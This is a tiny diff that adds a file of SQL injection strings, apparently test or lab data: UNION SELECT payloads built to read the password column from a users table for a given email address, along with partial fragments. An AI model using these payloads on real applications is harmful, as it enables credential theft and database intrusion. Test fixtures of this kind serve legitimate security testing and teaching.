@@ -1,0 +1,6 @@
+1' UNION SELECT 'alice@example.com','Alice',password FROM users where email = 'mallory@example.com
+
+mallory@example.com'
+alice@example.com' UNION SELECT name,'Alice',password FROM users WHERE email = 'mallory@example.com
+
+name,'Alice',
